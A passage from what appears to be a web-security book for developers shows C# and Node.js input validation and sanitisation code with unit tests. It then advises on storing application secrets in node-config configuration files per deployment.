                "î-icirc",
                "ï-iuml",
                "ð-eth",
                "ñ-ntilde",
                "ò-ograve",
                "ó-oacute",
                "ô-ocirc",
                "õ-otilde",
                "ö-ouml",
                "÷-divide",
                "ø-oslash",
                "ù-ugrave",
                "ú-uacute",
                "û-ucirc",
                "ü-uuml",
                "ý-yacute",
                "þ-thorn",
                "ÿ-yuml",
                "Œ-OElig",
                "œ-oelig",
                "Š-Scaron",
                "š-scaron",
                "Ÿ-Yuml",
                "ƒ-fnof",
                "\x02C6-circ",
                "˜-tilde",
                "Α-Alpha",
                "Β-Beta",
                "Γ-Gamma",
                "Δ-Delta",
                "Ε-Epsilon",
                "Ζ-Zeta",
                "Η-Eta",
                "Θ-Theta",
                "Ι-Iota",
                "Κ-Kappa",
                "Λ-Lambda",
                "Μ-Mu",
                "Ν-Nu",
                "Ξ-Xi",
                "Ο-Omicron",
                "Π-Pi",
                "Ρ-Rho",
                "Σ-Sigma",
                "Τ-Tau",
                "Υ-Upsilon",
                "Φ-Phi",
                "Χ-Chi",
                "Ψ-Psi",
                "Ω-Omega",
                "α-alpha",
                "β-beta",
                "γ-gamma",
                "δ-delta",
                "ε-epsilon",
                "ζ-zeta",
                "η-eta",
                "θ-theta",
                "ι-iota",
                "κ-kappa",
                "λ-lambda",
                "μ-mu",
                "ν-nu",
                "ξ-xi",
                "ο-omicron",
                "π-pi",
                "ρ-rho",
                "ς-sigmaf",
                "σ-sigma",
                "τ-tau",
                "υ-upsilon",
                "φ-phi",
                "χ-chi",
                "ψ-psi",
                "ω-omega",
                "ϑ-thetasym",
                "ϒ-upsih",
                "ϖ-piv",
                " -ensp",
                " -emsp",
                " -thinsp",
                "\x200C-zwnj",
                "\x200D-zwj",
                "\x200E-lrm",
                "\x200F-rlm",
                "–-ndash",
                "—-mdash",
                "‘-lsquo",
                "’-rsquo",
                "‚-sbquo",
                "“-ldquo",
                "”-rdquo",
                "„-bdquo",
                "†-dagger",
                "‡-Dagger",
                "•-bull",
                "…-hellip",
                "‰-permil",
                "′-prime",
                "″-Prime",
                "‹-lsaquo",
                "›-rsaquo",
                "‾-oline",
                "⁄-frasl",
                "€-euro",
                "ℑ-image",
                "℘-weierp",
                "ℜ-real",
                "™-trade",
                "ℵ-alefsym",
                "←-larr",
                "↑-uarr",
                "→-rarr",
                "↓-darr",
                "↔-harr",
                "↵-crarr",
                "⇐-lArr",
                "⇑-uArr",
                "⇒-rArr",
                "⇓-dArr",
                "⇔-hArr",
                "∀-forall",
                "∂-part",
                "∃-exist",
                "∅-empty",
                "∇-nabla",
                "∈-isin",
                "∉-notin",
                "∋-ni",
                "∏-prod",
                "∑-sum",
                "−-minus",
                "∗-lowast",
                "√-radic",
                "∝-prop",
                "∞-infin",
                "∠-ang",
                "∧-and",
                "∨-or",
                "∩-cap",
                "∪-cup",
                "∫-int",
                "∴-there4",
                "∼-sim",
                "≅-cong",
                "≈-asymp",
                "≠-ne",
                "≡-equiv",
                "≤-le",
                "≥-ge",
                "⊂-sub",
                "⊃-sup",
                "⊄-nsub",
                "⊆-sube",
                "⊇-supe",
                "⊕-oplus",
                "⊗-otimes",
                "⊥-perp",
                "⋅-sdot",
                "⌈-lceil",
                "⌉-rceil",
                "⌊-lfloor",
                "⌋-rfloor",
                "〈-lang",
                "〉-rang",
                "◊-loz",
                "♠-spades",
                "♣-clubs",
                "♥-hearts",
                "♦-diams"
             };    

             private static Dictionary<string, char> _lookupTable = GenerateLookupTable();    

             private static Dictionary<string, char> GenerateLookupTable() {
                Dictionary<string, char> dictionary =
                   new Dictionary<string, char>(StringComparer.Ordinal);
                foreach (string str in _entitiesList)
                   dictionary.Add(str.Substring(2), str[0]);
                return dictionary;
             }    

             public static char Lookup(string entity) {
                char ch;
                _lookupTable.TryGetValue(entity, out ch);
                return ch;
             }
          }
       }
    }

To drive the development of the `Sanitisation` API, we wrote the following tests. We created a `MockedOperationContext`, code not included here. We also used RhinoMocks as our mocking framework which is no longer being maintained. I would recommend NSubstitute instead if you were looking for a mocking framework for .NET. We also used NLog and wrapped it in `Common.Wrapper.Log`

{title="Drive Sanitisation API development", linenos=off, lang=C#}
    using System;
    using System.ServiceModel;
    using System.ServiceModel.Channels;
    using NUnit.Framework;
    using System.Configuration;
    using Rhino.Mocks;
    using Common.Wrapper.Log;
    using Common.WcfMock;
    using Common.WcfHelpers.ErrorHandling.Exceptions;
     
    namespace Sanitisation.UnitTest {
       [TestFixture]
       public class SanitiseTest {
          private const string _myTestIpv4Address = "My.Test.Ipv4.Address";
          private readonly int _maxLengthHtmlEncodedUserInput =
             int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlEncodedUserInput"]);
          private readonly int _maxLengthHtmlDecodedUserInput =
             int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlDecodedUserInput"]);
          private readonly string _encodedUserInput_thatsMaxDecodedLength =
             @"One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.";
          private readonly string _decodedUserInput_thatsMaxLength =
             @"One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.";
     
          [Test]
          public void Sanitise_UserInput_WhenGivenNull_ShouldReturnEmptyString() {
             Assert.That(new Sanitise().UserInput(null), Is.EqualTo(string.Empty));
          }
     
          [Test]
          public void Sanitise_UserInput_WhenGivenEmptyString_ShouldReturnEmptyString() {
             Assert.That(new Sanitise().UserInput(string.Empty), Is.EqualTo(string.Empty));
          }

          [Test]
          public void Sanitise_UserInput_WhenGivenSanitisedString_ShouldReturnSanitisedString(
          ) {
             // Open the whitelist up in order to test the encoding without restriction.
             Assert.That(
                new Sanitise(whiteList: @"^[\w\s\.,#/&'<"">]+$").
                UserInput(_encodedUserInput_thatsMaxDecodedLength),
                Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength)
             );
          }    

          [Test]
          [ExpectedException(typeof(SanitisationWcfException))]
          public void Sanitise_UserInput_ShouldThrowExceptionIfEscapedInputToLong() {
             // Truncated just for display. Create a string of 4001 characters.
             string fourThousandAndOneCharacters =
                "Four thousand characters.";
             string expectedError =
                "The un-modified string received from the client with " +
                "the following IP address: " +
                '"' + _myTestIpv4Address + "\" " +
                "exceeded the allowed maximum length of an escaped Html user input string. " +
                "The maximum length allowed is: " +
                _maxLengthHtmlEncodedUserInput +
                ". The length was: " +
                (_maxLengthHtmlEncodedUserInput+1) + ".";    

             using(new MockedOperationContext(StubbedOperationContext)) {
                try {
                   new Sanitise().UserInput(fourThousandAndOneCharacters);
                }
                catch(SanitisationWcfException e) {
                   Assert.That(e.Message, Is.EqualTo(expectedError));
                   Assert.That(e.UnsanitisedAnswer, Is.EqualTo(fourThousandAndOneCharacters));
                   throw;
                }
             }
          }    

          [Test]
          [ExpectedException(typeof(SanitisationWcfException))]
          public void Sanitise_UserInput_DecodedUserInputShouldThrowException_WhenMaxLengthHtmlDecodedUserInputIsExceeded() {
             char oneCharOverTheLimit = '.';
             string expectedError =
                "The string received from the client with the following IP address: " +
                "\"" + _myTestIpv4Address + "\" " +
                "after Html decoding exceded the allowed maximum length of" +
                " an un-escaped Html user input string." +
                Environment.NewLine +
                "The maximum length allowed is: " +
                _maxLengthHtmlDecodedUserInput +
                ". The length was: " +
                (_decodedUserInput_thatsMaxLength + oneCharOverTheLimit).Length +
                oneCharOverTheLimit;    

             using(new MockedOperationContext(StubbedOperationContext)) {
                try {
                   new Sanitise().UserInput(
                      _encodedUserInput_thatsMaxDecodedLength + oneCharOverTheLimit
                   );
                }
                catch(SanitisationWcfException e) {
                   Assert.That(e.Message, Is.EqualTo(expectedError));
                   Assert.That(
                      e.UnsanitisedAnswer,
                      Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength + oneCharOverTheLimit)
                   );
                   throw;
                }
             }
          }    

          [Test]
          public void Sanitise_UserInput_ShouldLogAndSendEmail_IfNumberOfDecodedHtmlEntitiesDoesNotMatchNumberOfEscapes() {
             string encodedUserInput_with6HtmlEntitiesNotEscaped =
                _encodedUserInput_thatsMaxDecodedLength.Replace("&amp;#x2F;", "/");
             string errorWeAreExpecting =
                "It appears as if someone has circumvented the client side Html entity " +
                "encoding." + Environment.NewLine +
                "The requesting IP address was: " +
                "\"" + _myTestIpv4Address + "\" " +
                "The sanitised input we receive from the client was the following:" +
                Environment.NewLine +
                "\"" + encodedUserInput_with6HtmlEntitiesNotEscaped + "\"" +
                Environment.NewLine +
                "The same input after decoding and re-escaping on the server side was " +
                "the following:" +
                Environment.NewLine +
                "\"" + _encodedUserInput_thatsMaxDecodedLength + "\"";
             string sanitised;
             // setup _logger
             ILogger logger = MockRepository.GenerateMock<ILogger>();
             logger.Expect(lgr => lgr.logError(errorWeAreExpecting));    

             Sanitise sanitise = new Sanitise(@"^[\w\s\.,#/&'<"">]+$", logger);    

             using (new MockedOperationContext(StubbedOperationContext)) {
                // Open the whitelist up in order to test the encoding etc.
                sanitised = sanitise.UserInput(encodedUserInput_with6HtmlEntitiesNotEscaped);
             }    

             Assert.That(sanitised, Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength));
             logger.VerifyAllExpectations();
          }              

          private static IOperationContext StubbedOperationContext {
             get {
                IOperationContext operationContext =
                   MockRepository.GenerateStub<IOperationContext>();
                int port = 80;
                RemoteEndpointMessageProperty remoteEndpointMessageProperty =
                   new RemoteEndpointMessageProperty(_myTestIpv4Address, port);
                operationContext.Stub(
                   oc => oc.IncomingMessageProperties[RemoteEndpointMessageProperty.Name]
                ).Return(remoteEndpointMessageProperty);
                return operationContext;
             }
          }
       }
    }

And finally the API code we used to perform the sanitisation:

Simple Injector

{title="Sanitisation API", linenos=on, lang=C#}
    using System;
    using System.Configuration;
    // Todo : Ideally we should be using Dependency Injection.
    // Researched best candidate was Simple Injector.
    using OperationContext = System.ServiceModel.Web.MockedOperationContext;
    using System.ServiceModel.Channels;
    using Common.Security.Sanitisation;
    using Common.WcfHelpers.ErrorHandling.Exceptions;
    using Common.Wrapper.Log;
     
    namespace Sanitisation {
     
       public class Sanitise {
          private readonly string _whiteList;
          private readonly ILogger _logger;
     
          private string RequestingIpAddress {
             get {
                RemoteEndpointMessageProperty remoteEndpointMessageProperty =
                   OperationContext.Current.IncomingMessageProperties[
                      RemoteEndpointMessageProperty.Name
                   ] as RemoteEndpointMessageProperty;
                return (
                   (remoteEndpointMessageProperty != null) ?
                   remoteEndpointMessageProperty.Address :
                   string.Empty
                );
             }
          }

          /// <summary>
          /// Provides server side escaping of Html entities, and runs the supplied
          /// whitelist character filter over the user input string.
          /// </summary>
          /// <param name="whiteList">Should be provided by DI from the ResourceFile.</param>
          /// <param name="logger">
          /// Should be provided by DI. Needs to be an asynchronous logger.
          /// </param>
          /// <example>
          /// The whitelist can be obtained from a ResourceFile like so...
          /// <code>
          /// private Resource _resource;
          /// _resource.GetString("WhiteList");
          /// </code>
          /// </example>
          public Sanitise(string whiteList = "", ILogger logger = null) {
             _whiteList = whiteList;
             _logger = logger ?? new Logger();
          }

          /// <summary>
          /// 1) Check field lengths.         Client side validation may have been negated.
          /// 2) Check against white list.    Client side validation may have been negated.
          /// 3) Check Html escaping.         Client side validation may have been negated.
           
          /// Generic Fail actions:   * Drop the payload.
          ///                           No point in trying to massage and save,
          ///                           as it won't be what the user was expecting,
          ///                         * Add full error to a WCFException Message and throw.
          ///                         * WCF interception reads WCFException.MessageForClient,
          ///                           and sends it to the user.
          ///                         * On return, log the WCFException's Message.
          ///                         
          /// Escape Fail actions:    * Asynchronously Log and email full error to support.
           
           
          /// 1) BA confirmed 50 for text, and 400 for textarea.
          ///     As we don't know the field type, we'll have to go for 400."
          ///
          ///     First we need to check that we haven't been sent some huge string.
          ///     So we check that the string isn't longer than 400 * 10 = 4000.
          ///     10 is the length of our double escaped character references.
          ///     Or, we ask the business for a number."
          ///     If we fail here,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          ///     Convert all Html Entity Encodings back to their equivalent characters,
          ///        and count how many occurrences.
          ///
          ///     If the string is longer than 400,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          /// 2) check all characters against the white list
          ///     If any don't match,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          /// 3) re html escape (as we did in JavaScript), and count how many escapes.
          ///     If cnt > cnt of Html Entity Encodings back to their equivalent characters,
          ///        Perform Escape Fail actions. Return sanitised string.
          /// 
          ///     If we haven't returned, return sanitised string.
           
           
          /// Performs checking on the text passed in,
          ///    to verify that client side escaping and whitelist validation
          ///    has already been performed.
          /// Performs decoding, and re-encodes.
          ///    Counts that the number of escapes was the same,
          ///    otherwise we log and send email with the details to support.
          /// Throws exception if the client side validation failed to restrict the
          ///    number of characters in the escaped string we received.
          ///    This needs to be intercepted at the service.
          ///    The exceptions default message for client needs to be passed back to the user.
          ///    On return, the interception needs to log the exception's message.
          /// </summary>
          /// <param name="sanitiseMe"></param>
          /// <returns></returns>
          public string UserInput(string sanitiseMe) {
             if (string.IsNullOrEmpty(sanitiseMe))
                return string.Empty;
           
             ThrowExceptionIfEscapedInputToLong(sanitiseMe);
           
             int numberOfDecodedHtmlEntities = 0;
             string decodedUserInput =
                HtmlDecodeUserInput(sanitiseMe, ref numberOfDecodedHtmlEntities);
           
             if(!decodedUserInput.CompliesWithWhitelist(whiteList: _whiteList)) {
                string error =
                   "The answer received from client with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "had characters that failed to match the whitelist.";
                throw new SanitisationWcfException(error);
             }
           
             int numberOfEscapes = 0;
             string sanitisedUserInput = decodedUserInput.HtmlEncode(ref numberOfEscapes);
           
             if(numberOfEscapes != numberOfDecodedHtmlEntities) {
                AsyncLogAndEmail(sanitiseMe, sanitisedUserInput);
             }
           
             return sanitisedUserInput;
          }

          /// <note>
          /// Make sure the logger is setup to log asynchronously
          /// </note>
          private void AsyncLogAndEmail(string sanitiseMe, string sanitisedUserInput) {
             // no need for SanitisationException    

             _logger.logError(
                "It appears as if someone has circumvented the client side " +
                "Html entity encoding." +
                Environment.NewLine +
                "The requesting IP address was: " +
                "\"" + RequestingIpAddress + "\" " +
                "The sanitised input we receive from the client was the following:" +
                Environment.NewLine +
                "\"" + sanitiseMe + "\"" +
                Environment.NewLine +
                "The same input after decoding and re-escaping on the " +
                "server side was the following:" +
                Environment.NewLine +
                "\"" + sanitisedUserInput + "\""
             );
          }

          /// <summary>
          /// This procedure may throw a SanitisationWcfException.
          /// If it does, ErrorHandlerBehaviorAttribute will need to pass the
          /// "messageForClient" back to the client from within the
          /// IErrorHandler.ProvideFault procedure.
          /// Once execution is returned,
          /// the IErrorHandler.HandleError procedure of ErrorHandlerBehaviorAttribute
          /// will continue to process the exception that was thrown in the way of
          /// logging sensitive info.
          /// </summary>
          /// <param name="toSanitise"></param>
          private void ThrowExceptionIfEscapedInputToLong(string toSanitise) {
             int maxLengthHtmlEncodedUserInput =
                int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlEncodedUserInput"]);
             if (toSanitise.Length > maxLengthHtmlEncodedUserInput) {
                string error =
                   "The un-modified string received from the client " +
                   "with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "exceeded the allowed maximum length of " +
                   "an escaped Html user input string. " +
                   "The maximum length allowed is: " +
                   maxLengthHtmlEncodedUserInput +
                   ". The length was: " +
                   toSanitise.Length + ".";
                throw new SanitisationWcfException(error, unsanitisedAnswer: toSanitise);
             }
          }

          private string HtmlDecodeUserInput(
             string doubleEncodedUserInput,
             ref int numberOfDecodedHtmlEntities
          ) {
             string decodedUserInput =
                doubleEncodedUserInput.HtmlDecode(
                   ref numberOfDecodedHtmlEntities
                ).HtmlDecode(ref numberOfDecodedHtmlEntities) ??
                string.Empty;
             
             // if the decoded string is longer than MaxLengthHtmlDecodedUserInput throw
             int maxLengthHtmlDecodedUserInput =
                int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlDecodedUserInput"]);
             if(decodedUserInput.Length > maxLengthHtmlDecodedUserInput) {
                throw new SanitisationWcfException(
                   "The string received from the client with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "after Html decoding exceded the allowed maximum length " +
                   "of an un-escaped Html user input string." +
                   Environment.NewLine +
                   "The maximum length allowed is: " +
                   maxLengthHtmlDecodedUserInput +
                   ". The length was: " +
                   decodedUserInput.Length + ".",
                   unsanitisedAnswer: doubleEncodedUserInput
                );
             }
             return decodedUserInput;
          }
       }
    }

As you can see, there is a lot more work on the server side than the client side.

##### Example in JavaScript and NodeJS

A>
A> Without sanitisation, things are a lot simpler.
A>

For the next example we use a single page app. Switching to `jQuery.validator` on the client side and `express-form` on the server side. Our example is a simple contact form. I have only shown the parts relevant to validation and filtering.

Once the jQuery plugin (which is a module) `validate` is loaded, jQuery is passed to it. The plugin extends the jQuery prototype with its `validate` method. Our contact.js script then loads in the browser. We then call `ContactForm.initContactForm();`. ContactForm is immediately invoked and returns an object, of which we call `initContactForm()` on.

We add a custom validation function to our `validator` by way of `addMethod`. This function will take the value being tested, the element itself and a regular expression to test against. You can see we use this function when we pass our rules within the `options` object to `validate` which internally passes them to its `validator`.

The `validate` documentation explains the sequence of events that your custom rules will be applied in.

We pass `options` containing:

* `rules`
* `messages`
* `submitHandler` which is bound to the native `submit` event

There are many other options you can provide. I think the code is fairly self explanatory:

{title="contact.js", linenos=off, lang=JavaScript}
    var ContactForm = function () {

       return {

          //Contact Form
          initContactForm: function () {
             // Validation
             $.validator.addMethod('fieldValidated', function (value, element, regexpr) {
                return regexpr.test(value);
             },
             'No dodgy characters thanks.');
             $("#sky-form3").validate({
                // Rules for form validation
                rules: {
                   name: {
                      required: true,
                      minlength: 2,
                      maxlength: 50,
                      fieldValidated: /^[a-zA-Z ']+$/
                   },
                   email: {
                      required: true,
                      email: true
                   },
                   message: {
                      required: true,
                      minlength: 10,
                      maxlength: 1000,
                      fieldValidated: /^[a-zA-Z0-9-_ \?.,]+$/
                   }
                },

                // Messages for form validation
                messages: {
                   name: {
                      required: 'Please enter your name'
                   },
                   email: {
                      required: 'Please enter your email address',
                      email: 'Please enter a VALID email address'
                   },
                   message: {
                      required: 'Please enter your message'
                   }
                },

                // Ajax form submition. For details see jQuery Form Plugin:
                // http://malsup.com/jquery/form/
                submitHandler: function (form) {
                   $(form).ajaxSubmit({
                      beforeSend: function () {
                         // Useful for doing things like adding wait spinners
                         // or any work you want to do before sending.
                         // Todo: I think we need a wait spinner here.
                      },
                      // type: 'POST' // Default;
                      dataType: 'json',
                      success: function (responseText, statusText) {
                         // Handle success
                      },
                      error: function (error) {
                         // Handle error
                      }
                   });
                },

                // Do not change code below
                errorPlacement: function(error, element) {
                   error.insertAfter(element.parent());
                }
             });
          }
       };
    }();

Shifting our attention to the server side now. First up we have got the home route of the single page app. Within the home route, we have also got the `/contact` route which uses the `express-form` middleware. You can see the middleware first in action on line 80.

{title="routes/home.js", linenos=on, lang=JavaScript}
    var logger = require('../util/logger');
    var form = require('express-form');
    var fieldToValidate = form.field;
    var os = require('os');    

    function home(req, res) {
      res.redirect('/');
    }

    function index(req, res) {
       res.render('home', { title: 'Home', id: 'home', brand: 'your brand' });
    }

    function validate() {
       return form(
          // trim is filtering. toBoolean is some simple sanitisation. The rest is validation.
          fieldToValidate('name').
             trim().
             required().
             minLength(2).
             maxLength(50).
             is(/^[a-zA-Z ']+$/), // Regex same as cleint side.
          fieldToValidate('email').
             trim().
             required().
             isEmail(),
          fieldToValidate('message').
             trim().
             required().
             minLength(10).
             maxLength(1000).
             is(/^[a-zA-Z0-9-_ \?.,]+$/), // Regex same as cleint side.
          fieldToValidate('subscribe-to-mailing-list').toBoolean(),
          fieldToValidate('bot-pot').maxLength(0) // Bots love to populate everything.
          //fieldToValidate('bot-pot').equals("")
       );
    }

    // Using express-form: req.form is the validated req.body
    function contact(req, res) {
       
       if(req.form.isValid)
          sendEmail(req, res);
       else {
          (function alertEmail() {
             var reqBody =
                'Body of contact request (server-side unvalidated): ' +
                JSON.stringify(req.body);
             var reqForm =
                'Form of contact request (server-side validated): ' +
                JSON.stringify(req.form);
             var validationErrors =
                'Errors produced by express-form validation: ' +
                req.form.errors;
             var details =
                os.EOL +
                reqBody +
                os.EOL +
                os.EOL +
                reqForm +
                os.EOL +
                os.EOL +
                validationErrors +
                os.EOL;
             // Logger.emailLoggerFailure shown in the Insufficient Logging section
             logger.crit(
                '',
                'Validation error for my website contact form. ',
                {details: details},
                logger.emailLoggerFailure
             );
          }());
          res.status(418).send({error: 'User input was not valid. Try teliporting instead.'});
       }
    }

    module.exports = function (app) {
       app.get('/', index);
       app.get('/home', home); 
       app.post('/contact', validate(), contact);
    };

Following is the routing module that loads all other routes

{title="routes/index.js", linenos=off, lang=JavaScript}
    // This module loads dynamically all routes modules located in the routes/ directory.
     
    'use strict';
    var fs = require('fs');
    var path = require('path');

    module.exports = function (app) {
       fs.readdirSync(path.join(__dirname)).forEach(function (file) {
          // Avoid to read this current file.
          if (file === path.basename(__filename)) { return; }

          // Load the route file.
          require('./' + file)(app);
       });
    };

Now our entry point into the application. We load routes on line 30.

{title="app.js", linenos=on, lang=JavaScript}
    var http = require('http');
    var express = require('express');
    var path = require('path');
    var morganLogger = require('morgan');
    // Due to bug in node-config the next line is needed before config is required.
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
    // Yes the following are hoisted, but it's OK in this situation.
    var logger = require('./util/logger'); // Or use requireFrom module so no relative paths.
    var methodOverride = require('method-override');
    // body-parser needs to be added in the middleware stack before using
    // express-form: https://github.com/freewil/express-form/issues/21
    var bodyParser = require('body-parser');
    var errorHandler = require('errorhandler');
    var app = express();
    //...
    logger.init();
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    //...
    // In order to utilise connect/express logger module in our third party logger,
    // Pipe the messages through.
    app.use(morganLogger('combined', {stream: logger.stream}));
    app.use(methodOverride());
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static(path.join(__dirname, 'public')));
    //...
    require('./routes')(app);

    if ('development' == app.get('env')) {
       app.use(errorHandler({ dumpExceptions: true, showStack: true }));
       //...
    }
    if ('production' == app.get('env')) {
       app.use(errorHandler());
       //...
    }

    http.createServer(app).listen(app.get('port'), function(){
       logger.info(
          "Express server listening on port " + app.get('port') + ' in '
          + process.env.NODE_ENV + ' mode'
       );
    });

As I mentioned previously in the ["What is Validation"](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation) section, some of the libraries seem confused about the differences between the practises of validation, filtering and sanitisation. For example `express-form` has sanitisation functions that are under their ["Filter API"](https://github.com/freewil/express-form#filter-api). 
`entityEncode`, `entityDecode`, even the Type Coercion functions are actually sanitisation rather than filtering.

Maybe it is semantics, but `toFloat`, `toInt`, ... `ifNull` are sanitisation functions.

`trim`, ... is filtering, but `toLower`, ... is sanitisation again. These functions listed in the documentation under the Filter API should be in their specific sections.

Refer to the section [above](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation) for a refresher on validation, filtering and sanitisation if you need it.

##### Other things to think about

* Try and make all of your specific input fields conform to well structured semantic types. Like dates, social security numbers, zip codes, email addresses, etc. This way the developer should be able to define a very strong validation, filtering and sanitisation (if needed) specification for each one. Thus making the task of assuring all input is safe before it reaches any execution contexts easier.
* If the input field comes from a fixed set of options, like a drop down list or radio buttons, then the input needs to match exactly one of the values offered to the user in the first place.
* Database accounts (in fact all accounts) should use [least privilege](#web-applications-countermeasures-management-of-application-secrets-least-privilege)
* Well structured data, like dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern

#### Buffer Overflows {#web-applications-countermeasures-buffer-overflows}

_Todo_

#### Cross-Site Scripting (XSS) {#web-applications-countermeasures-cross-site-scripting}

_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/4)

%% https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

#### Cross-Site Request Forgery (CSRF)

_Todo_

#### SQLi {#web-applications-countermeasures-sqli}

There are a few options here:

* Use prepared statements and/or parameterised queries
* Consider using Stored Procedures
* Read up on the [OWASP SQLi Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

#### Command Injection {#web-applications-countermeasures-command-injection}

On top of the points mentioned above under [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation), 
[This article](http://www.golemtechnologies.com/articles/shell-injection) is quite good.

%% Command Injection in NodeJS: https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js

#### LDAP Injection {#web-applications-countermeasures-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-countermeasures-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-countermeasures-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-countermeasures-xslt-injection}

_Todo_

#### XML Injection {#web-applications-countermeasures-xml-injection}

_Todo_

### Management of Application Secrets {#web-applications-countermeasures-management-of-application-secrets}

Secure password management within applications is a case of doing what you can, often relying on obscurity and leaning on other layers of defence to make it harder for compromise. Like many of the layers already discussed in the previous chapters.

[Find out](#network-countermeasures-wire-inspecting) how secret the data that is supposed to be secret that is being sent over the network actually is and consider your internal network just as malicious as the internet. Then you will be starting to get the idea of what defence in depth is about. That way when one defence breaks down, you will still be in good standing.

![](images/DefenceInDepth.png)

You may read in many places that having data-store passwords and other types of secrets in configuration files in clear text is an insecurity that must be addressed. Then when it comes to mitigation, there seems to be a few techniques for helping, but most of them are based around obscuring the secret rather than securing it. Essentially just making discovery a little more inconvenient like using an alternative port to SSH to other than the default of 22. Maybe surprisingly though, obscurity does significantly reduce the number of opportunistic type attacks from bots and script kiddies.

#### Store Configuration in Configuration files {#web-applications-countermeasures-management-of-application-secrets-store-configuration}
![](images/ThreatTags/PreventionAVERAGE.png)

Do not hard code passwords in source files for all developers to see. Doing so also means the code has to be patched when services are breached. At the very least, store them in configuration files and use different configuration files for different deployments and consider keeping them out of source control.

Here are some examples using the node-config module.

##### node-config

is a fully featured, well maintained configuration package that I have used on a good number of projects.

To install: From the command line within the root directory of your NodeJS application, run:

`npm install node-config --save`

Now you are ready to start using node-config. An example of the relevant section of an `app.js` file may look like the following:

{title="app.js", linenos=off, lang=JavaScript}
    // Due to bug in node-config the if statement is required before config is required
    // https://github.com/lorenwest/node-config/issues/202
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');


Where ever you use node-config, in your routes for example:

{title="home.js", linenos=off, lang=JavaScript}
    var config = require('config');
    var nodemailer = require('nodemailer');
    var enquiriesEmail = config.enquiries.email;
    
    // Setting up email transport.
    var transporter = nodemailer.createTransport({
       service: config.enquiries.service,
       auth: {
          user: config.enquiries.user,
          pass: config.enquiries.pass // App specific password.
       }
    });


A good collection of different formats can be used for the config files: `.json`, `.json5`, `.hjson`, `.yaml`, `.js`, `.coffee`, `.cson`, `.properties`, `.toml`

There is a specific [file loading order](https://github.com/lorenwest/node-config/wiki/Configuration-Files) which you specify by file naming convention, which provides a lot of flexibility and which caters for:

* Having multiple instances of the same application running on the same machine
* The use of short and full host names to mitigate machine naming collisions
* The type of deployment. This can be anything you set the `$NODE_ENV` environment variable to for example: `development`, `production`, `staging`, `whatever`.
* Using and creating config files which stay out of source control. These config files have a prefix of `local`. These files are to be managed by external configuration management tools, build scripts, etc. Thus providing even more flexibility about where your sensitive configuration values come from.

{pagebreak}

The config files for the required attributes used above may take the following directory structure:

{title="directory layout", linenos=off, lang=JavaScript}
    OurApp/
    |
    +-- config/
    |  |
    |  +-- default.js (usually has the most in it)
    |  |
    |  +-- devbox1-development.js
    |  |
    |  +-- devbox2-development.js
    |  |
    |  +-- stagingbox-staging.js
    |  |
    |  +-- prodbox-production.js
    |  |
    |  +-- local.js (creted by build)
    |
    +-- routes
    |  |
    |  +-- home.js
    |  |
    |  +-- ...
    |
    +-- clients
    |  |
    |  +-- ...
    |
    +-- app.js (entry point)
    |
    +-- ...


The contents of the above example configuration files may look like the following:

{title="default.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Supported services:
          // https://github.com/andris9/nodemailer-wellknown#supported-services
          // supported-services actually use the best security settings by default.
          // I tested this with a wire capture, because it is always the most fool proof way.
          service: 'FastMail',
          email: 'yourusername@fastmail.com',
          user: 'yourusername',
          pass: null
       }
       // Lots of other settings.
       // ...
    }

{title="devbox1-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Test password for developer on devbox1
          pass: 'D[6F9,4fM6?%2ULnirPVTk#Q*7Z+5n' // App specific password.
       }
    }

{title="devbox2-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
